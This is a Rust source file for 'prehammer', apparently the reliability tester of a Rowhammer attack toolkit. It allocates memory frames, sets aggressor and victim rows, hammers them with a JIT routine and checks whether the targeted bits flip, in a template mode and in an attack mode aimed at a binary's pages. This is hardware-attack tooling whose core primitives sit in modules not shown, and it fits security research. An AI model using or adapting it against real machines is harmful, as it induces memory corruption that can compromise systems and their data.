use log::*;
use std::time::Duration;
use colored::Colorize;

use rowhammer::{*, config::*};
use rowhammer::utils::{dram, files, serialize::*};

pub static CONSECUTIVE_SUCCESSES: u8 = 5;
pub static GIVE_UP_THESHOLD: u8 = 20;

//"template tester" mode: hammers the victims in the given memory template,
//  Performs intitializations and hammering on a victim specific basis
//"attack tester" mode: hammers the aggrs without loading the attacked binary,
//  All initializations happen at the start before the hammering starts, so
//  be caseful with overlappings
//  Config in attack_config.toml, ignores the `page_file_offset` and
//  `segment_virt_addr` fields
//Both stop if there are either CONSECUTIVE_SUCCESSES consecutive successes or
//after GIVE_UP_THESHOLD iterations
//
//USAGE: sudo ./prehammer mode attack_config/memory_template
//  `mode` is either `attack` for the "attack tester" mode, or anything else for
//  the "template tester" mode
//  `attack_config/memory_template` is the path to the attack_config toml file
//  for the "attack tester" mode, or the memory_template json file for the
//  "template tester" mode

pub fn main() {
  info!("Starting prehammer");
  let mut logger_builder = rowhammer::configure();
  //logger_builder.filter_module("rowhammer", LevelFilter::Info);
  logger_builder.init();
  let args: Vec<_> = std::env::args().collect();

  if args[1] == "attack" {
    run_attack_tester(&args[2]);
  } else {
    run_template_tester(&args[2]);
  }
}

fn run_template_tester(path: &str) {
  info!("Prehammer using rowhammer template");
  let memory_template = files::parse_json::<MemoryTemplate>(path);
  let hammer_count = memory_template.templater_config.hammer_count;

  //allocate all required frames
  let frames_to_allocate = memory_template.victims.iter()
    .map(|(t,_,_)| t & PAGE_ALIGN_MASK)
    .chain(memory_template.aggr_patterns.iter()
    .map(|x| &x.pattern).flatten().map(|x| &x.frames).flatten().cloned())
    .collect();
  let frame2map = allocation::allocate_pages(frames_to_allocate, 0f64);

  //do everything separately for each victim
  let mut successes = Vec::new();
  for victim in memory_template.victims {
    let aggrs = &memory_template.aggr_patterns[victim.2];
    let victim_frame = VictimFrame {
      page_file_offset: None,
      frame_addr: victim.0 & PAGE_ALIGN_MASK,
      victim_bits: vec![VictimBit {
        offset: victim.0 % PAGE_SIZE as u64,
        bitflip: victim.1.clone(),
        aggr_pattern_key: victim.2.to_string()}]
    };

    //init aggr and victim rows
    //notice: we init the whole victim PAGE instead of only the victim bit
    mem_init::initialize_rows(aggrs.pattern.iter(), &frame2map);
    mem_init::initialize_rows(std::iter::once(&RowAndInitValue{
      //only one page!! (bcs other not allocated)
      frames: vec![victim.0 & PAGE_ALIGN_MASK],
      init: if victim.1.flip_direction {0x0} else {0xff}
    }), &frame2map);

    let content_cache =
      mem_init::read_victim_content(std::iter::once(&victim_frame), &frame2map);

    //the hammer loop
    let mut consecutive_successes = 1;
    let mut iteration = 0;
    //TODO try with this as outer loop as well
    while consecutive_successes <= CONSECUTIVE_SUCCESSES
      && iteration < GIVE_UP_THESHOLD
    {
      info!("#### STARTING ITERATION {} ####", iteration);
      //reinitialize victims
      mem_init::initialize_rows(std::iter::once(&RowAndInitValue{
        frames: vec![victim.0 & PAGE_ALIGN_MASK],
        init: if victim.1.flip_direction {0x0} else {0xff}
      }), &frame2map);

      //hammer
      let aggrs = aggrs.aggr_rows_to_virt(&frame2map);
      std::thread::sleep(Duration::new(2, 0));
      //hammer::hammer_rust(&aggrs, hammer_count);
      //hammer::hammer_asm(&aggrs, 40, hammer_count);
      hammer::hammer_jit(&aggrs, 40, hammer_count);

      //check for flips
      if flip_checks::check_victim_flips(
        std::iter::once(&victim_frame), &frame2map, &content_cache
      ) {
        info!("{}", format!("--> All victim bytes changed, \
          consecutive_successes = {}", consecutive_successes).green());
        consecutive_successes += 1;
      } else {
        info!("{}", format!("--> Not all victim bytes changed").red());
        consecutive_successes = 1;
      }

      iteration += 1;
    }

    if iteration == GIVE_UP_THESHOLD {
      info!("GAVE UP");
    } else {
        info!("SUCCESS");
        successes.push(victim);
    }
  }

  info!("Success list: (length: {})", successes.len());
  successes.iter().for_each(|x| info!("0x{:x} {} {}", x.0, x.1, x.2));
}

fn run_attack_tester(path: &str) {
  info!("Prehammer using attack config");
  let dram_config: DRAMConfig = dram::create_config();
  let attack_config = files::parse_toml::<AttackConfig>(path).validate();
  let frame2map = allocation::allocate_attack(&dram_config, &attack_config);

  //initialize victims
  //cannot use initialize_rows bcs it inits the whole row to the same value
  //There could, however, be diff init values for diff victims in the same row
  //=> init from attack_config (alternative: load pages from binary)
  mem_init::initialize_attack_victims(&attack_config, &frame2map);
  //bcs the attack config is validated, victims and aggressors do not overlap,
  //thus all aggressors can be initialized at once
  mem_init::initialize_rows(attack_config.iter_aggr_rows(), &frame2map);
  let content_cache = mem_init::read_victim_content(
    attack_config.victim_frames.iter(), &frame2map);

  //the hammer loop
  let mut consecutive_successes = 1;
  let mut iteration = 0;
  while consecutive_successes <= CONSECUTIVE_SUCCESSES
    && iteration < GIVE_UP_THESHOLD
  {
    info!("#### STARTING ITERATION {} ####", iteration);
    //reinitialize victims
    mem_init::initialize_attack_victims(&attack_config, &frame2map);

    //hammer
    for v in attack_config.iter_aggr_patterns_per_victim() {
      let aggrs = v.aggr_rows_to_virt(&frame2map);
      std::thread::sleep(Duration::new(2, 0));
      //hammer::hammer_rust(&aggrs, attack_config.hammer_count);
      //hammer::hammer_asm(&aggrs, 40, attack_config.hammer_count);
      hammer::hammer_jit(&aggrs, 40, attack_config.hammer_count);
    }

    //check for flips
    if flip_checks::check_victim_flips(
      attack_config.victim_frames.iter(), &frame2map, &content_cache
    ) {
      info!("{}", format!("--> All victim bytes changed, \
        consecutive_successes = {}", consecutive_successes).green());
      consecutive_successes += 1;
    } else {
      info!("{}", format!("--> Not all victim bytes changed").red());
      consecutive_successes = 1;
    }

    std::thread::sleep(Duration::new(0, 0));
    iteration += 1;
  }

  info!("{}", if iteration == GIVE_UP_THESHOLD {"GAVE UP"} else {"SUCCESS"});
}

